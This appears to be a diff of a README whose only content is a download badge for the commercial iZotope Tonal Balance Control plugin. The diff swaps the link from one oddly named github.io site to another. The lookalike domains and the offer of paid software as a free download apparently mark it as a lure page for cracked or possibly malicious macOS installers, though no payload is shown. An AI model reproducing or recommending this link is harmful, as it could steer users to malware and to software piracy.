@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/izotopetbc">
+  <a href="https://osx-quick-app.github.io/.github/izotopetbc">
     <img src="https://img.shields.io/badge/Get%20Tonal%20Balance%20Control-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get iZotope Tonal Balance Control">
   </a>
 </p>
